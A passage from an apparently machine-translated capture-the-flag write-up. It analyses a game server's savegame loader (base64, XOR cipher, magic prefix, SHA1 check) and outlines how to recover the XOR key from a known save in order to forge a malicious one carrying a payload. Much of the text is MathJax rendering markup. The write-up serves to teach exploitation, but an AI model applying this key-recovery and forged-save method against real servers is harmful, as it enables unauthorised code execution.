class="hljs-keyword">None</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-string"><span class="hljs-string">"Usage: '([lL]) *([0-9a-zA-Z+/]+=*) *', Cmd=\\1(Load) Save=\\2"</span></span>) msg = base64.standard_b64decode(m.group(<span class="hljs-number"><span class="hljs-number">1</span></span>)) tmp = <span class="hljs-string"><span class="hljs-string">""</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(<span class="hljs-number"><span class="hljs-number">0</span></span>, len(msg)): tmp += chr(ord(msg[i]) ^ ord(encrypt_key[i % len(encrypt_key)])) msg = tmp <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> msg[<span class="hljs-number"><span class="hljs-number">0</span></span>:<span class="hljs-number"><span class="hljs-number">9</span></span>] != <span class="hljs-string"><span class="hljs-string">"4n71cH3aT"</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-string"><span class="hljs-string">"Unable to load savegame (magic)"</span></span>) h = hashlib.sha1() h.update(msg[<span class="hljs-number"><span class="hljs-number">9</span></span>+h.digest_size:]) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> msg[<span class="hljs-number"><span class="hljs-number">9</span></span>:<span class="hljs-number"><span class="hljs-number">9</span></span>+h.digest_size] != h.digest(): <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-string"><span class="hljs-string">"Unable to load savegame (checksum)"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: f.load(msg[<span class="hljs-number"><span class="hljs-number">9</span></span>+h.digest_size:]) <span class="hljs-keyword"><span class="hljs-keyword">except</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-string"><span class="hljs-string">"Unable to load savegame (exception)"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-string"><span class="hljs-string">"Savegame loaded"</span></span>)</code> </pre><br>  Download takes place according to a similar algorithm, but in reverse order: <br><ol><li>  We decode the base64 string. </li><li>  Again, use the xor operation to get the original message. </li><li>  <i>We get rid</i> of the salt-prefix " <i>4n71cH3aT</i> ". </li><li>  We compare the existing message hash with the newly calculated one: if matched, then it is successful - <code>return (True, "Savegame loaded")</code> , otherwise, the checksum error is <code>return (True, "Unable to load savegame (checksum)")</code> . </li></ol><br>  The analysis of the code is completed, followed by the main ‚Äúclient-server‚Äù interaction cycle, which is of no interest to us. <br><br><h2>  <font color="#cc0000">Attack planning</font> </h2><br>  So, we have all the necessary information to write an exploit. <br><br>  A rough plan is this: create a malicious save file with a payload embedded in order to execute the desired shellcode and feed it to the server, thereby causing it to perform an action not intended by the creator of the game.  Our main task in this situation is to extract the server's secret key ( <i>part of the</i> secret key, to be exact: in our case, the field is small, and all 4096 bytes of the key are not used) to sign our save.  To do this, turn again to the following lines of the game saving method: <br><pre> <code class="python hljs">msg = f.save() h = hashlib.sha1() h.update(msg) msg = <span class="hljs-string"><span class="hljs-string">"4n71cH3aT"</span></span> + h.digest() + msg tmp = <span class="hljs-string"><span class="hljs-string">""</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(<span class="hljs-number"><span class="hljs-number">0</span></span>, len(msg)): tmp += chr(ord(msg[i]) ^ ord(encrypt_key[i % len(encrypt_key)]))</code> </pre><br>  The used cipher is a trivial xor cipher, therefore, knowing ALL the constituent equations <i>except the</i> secret key, we can easily extract it by simply banishing xor again: <br><p></p><p><math></math><span class="MathJax_Preview" style="color: inherit; display: none;"></span><div class="MathJax_SVG_Display" style="text-align: center;"><span class="MathJax_SVG" id="MathJax-Element-1-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot; display=&quot;block&quot;><mi>S</mi><mi>a</mi><mi>v</mi><mi>e</mi><mo>=</mo><mo stretchy=&quot;false&quot;>(</mo><mi>P</mi><mi>r</mi><mi>e</mi><mi>f</mi><mi>i</mi><mi>x</mi><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mo stretchy=&quot;false&quot;>|</mo></mrow><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mo stretchy=&quot;false&quot;>|</mo></mrow><mi>S</mi><mi>h</mi><mi>a</mi><mn>1</mn><mo stretchy=&quot;false&quot;>(</mo><mi>D</mi><mi>u</mi><mi>m</mi><mi>p</mi><mo stretchy=&quot;false&quot;>(</mo><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><mi>d</mi><mo stretchy=&quot;false&quot;>)</mo><mo stretchy=&quot;false&quot;>)</mo><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mo stretchy=&quot;false&quot;>|</mo></mrow><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mo stretchy=&quot;false&quot;>|</mo></mrow><mi>D</mi><mi>u</mi><mi>m</mi><mi>p</mi><mo stretchy=&quot;false&quot;>(</mo><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><mi>d</mi><mo stretchy=&quot;false&quot;>)</mo><mo stretchy=&quot;false&quot;>)</mo><mtext>&amp;#xA0;</mtext><mi>o</mi><mi>p</mi><mi>l</mi><mi>u</mi><mi>s</mi><mi>K</mi><mi>e</mi><mi>y</mi><mo>,</mo></math>" role="presentation" style="font-size: 100%; display: inline-block; position: relative;"><svg xmlns:xlink="http://www.w3.org/1999/xlink" width="65.324ex" height="2.66ex" viewBox="0 -832 28125.6 1145.2" role="img" focusable="false" style="vertical-align: -0.728ex;" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-53" x="0" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-61" x="645" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-76" x="1175" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-65" x="1660" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-3D" x="2404" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-28" x="3461" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-50" x="3850" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-72" x="4602" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-65" x="5053" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-66" x="5520" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-69" x="6070" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-78" x="6416" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-7C" x="6988" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-7C" x="7267" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-53" x="7545" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-68" x="8191" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-61" x="8767" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-31" x="9297" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-28" x="9797" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-44" x="10187" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-75" x="11015" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-6D" x="11588" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-70" x="12466" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-28" x="12970" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-46" x="13359" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-69" x="14109" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-65" x="14454" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-6C" x="14921" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-64" x="15219" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-29" x="15743" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-29" x="16132" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-7C" x="16522" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-7C" x="16800" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-44" x="17079" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-75" x="17907" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-6D" x="18480" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-70" x="19358" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-28" x="19862" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-46" x="20251" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-69" x="21001" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-65" x="21346" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-6C" x="21813" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-64" x="22111" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-29" x="22635" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-29" x="23024" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-6F" x="23664" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-70" x="24149" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-6C" x="24653" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-75" x="24951" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-73" x="25524" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-4B" x="25993" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-65" x="26883" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-79" x="27349" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-2C" x="27847" y="0"></use></g></svg><span class="MJX_Assistive_MathML MJX_Assistive_MathML_Block" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mi>S</mi><mi>a</mi><mi>v</mi><mi>e</mi><mo>=</mo><mo stretchy="false">(</mo><mi>P</mi><mi>r</mi><mi>e</mi><mi>f</mi><mi>i</mi><mi>x</mi><mrow class="MJX-TeXAtom-ORD"><mo stretchy="false">|</mo></mrow><mrow class="MJX-TeXAtom-ORD"><mo stretchy="false">|</mo></mrow><mi>S</mi><mi>h</mi><mi>a</mi><mn>1</mn><mo stretchy="false">(</mo><mi>D</mi><mi>u</mi><mi>m</mi><mi>p</mi><mo stretchy="false">(</mo><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><mi>d</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mrow class="MJX-TeXAtom-ORD"><mo stretchy="false">|</mo></mrow><mrow class="MJX-TeXAtom-ORD"><mo stretchy="false">|</mo></mrow><mi>D</mi><mi>u</mi><mi>m</mi><mi>p</mi><mo stretchy="false">(</mo><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><mi>d</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mtext>&nbsp;</mtext><mi>o</mi><mi>p</mi><mi>l</mi><mi>u</mi><mi>s</mi><mi>K</mi><mi>e</mi><mi>y</mi><mo>,</mo></math></span></span></div><script type="math/tex;mode=display" id="MathJax-Element-1"> Save = (Prefix || Sha1 (Dump (Field)) || Dump (Field)) \ oplus Key, </script></p><p></p><p><math></math><span class="MathJax_Preview" style="color: inherit; display: none;"></span><div class="MathJax_SVG_Display" style="text-align: center;"><span class="MathJax_SVG" id="MathJax-Element-2-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot; display=&quot;block&quot;><mi>K</mi><mi>e</mi><mi>y</mi><mo>=</mo><mo stretchy=&quot;false&quot;>(</mo><mi>P</mi><mi>r</mi><mi>e</mi><mi>f</mi><mi>i</mi><mi>x</mi><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mo stretchy=&quot;false&quot;>|</mo></mrow><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mo stretchy=&quot;false&quot;>|</mo></mrow><mi>S</mi><mi>h</mi><mi>a</mi><mn>1</mn><mo stretchy=&quot;false&quot;>(</mo><mi>D</mi><mi>u</mi><mi>m</mi><mi>p</mi><mo stretchy=&quot;false&quot;>(</mo><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><mi>d</mi><mo stretchy=&quot;false&quot;>)</mo><mo stretchy=&quot;false&quot;>)</mo><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mo stretchy=&quot;false&quot;>|</mo></mrow><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mo stretchy=&quot;false&quot;>|</mo></mrow><mi>D</mi><mi>u</mi><mi>m</mi><mi>p</mi><mo stretchy=&quot;false&quot;>(</mo><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><mi>d</mi><mo stretchy=&quot;false&quot;>)</mo><mo stretchy=&quot;false&quot;>)</mo><mtext>&amp;#xA0;</mtext><mi>o</mi><mi>p</mi><mi>l</mi><mi>u</mi><mi>s</mi><mi>S</mi><mi>a</mi><mi>v</mi><mi>e</mi><mo>,</mo></math>" role="presentation" style="font-size: 100%; display: inline-block; position: relative;"><svg xmlns:xlink="http://www.w3.org/1999/xlink" width="65.324ex" height="2.66ex" viewBox="0 -832 28125.6 1145.2" role="img" focusable="false" style="vertical-align: -0.728ex;" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-4B" x="0" y="0"></use><use 